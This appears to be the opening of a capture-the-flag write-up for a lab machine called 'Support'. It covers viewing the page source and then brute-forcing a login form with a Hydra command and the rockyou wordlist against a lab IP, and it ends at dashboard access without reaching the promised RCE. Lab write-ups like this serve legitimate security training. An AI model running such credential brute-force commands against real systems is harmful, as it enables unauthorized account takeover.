# Support 

A new internal Support Operations Platform has been deployed to assist IT and helpdesk teams. The application handles user management, internal APIs, and system-level operations. However, security was not the primary focus during development. Several features rely on user-controlled input and weak trust boundaries.

Can you pentest the platform and escalate your access to achieve RCE on the server?

------------

First step : view the page source to find how the platform handles credentials

<img width="831" height="165" alt="image" src="https://github.com/user-attachments/assets/752e68bc-d2cd-4934-9800-42c365992cc9" />

Since the email is the same for everybody, we can perform a brute force attack on common passwords

hydra -l help@support.thm -P /usr/share/wordlists/rockyou.txt 10.112.136.134 http-post-form "/index.php:email=^USER^&password=^PASS^:Invalid credentials" -V -f

<img width="1211" height="674" alt="image" src="https://github.com/user-attachments/assets/d08a6180-595a-4608-b4f3-beab38a2e8e1" />

We managed to enter the dashboard with the credentials retrieved

<img width="1682" height="431" alt="image" src="https://github.com/user-attachments/assets/bb5c7964-e11e-4ec4-92a0-f54318dd060c" />
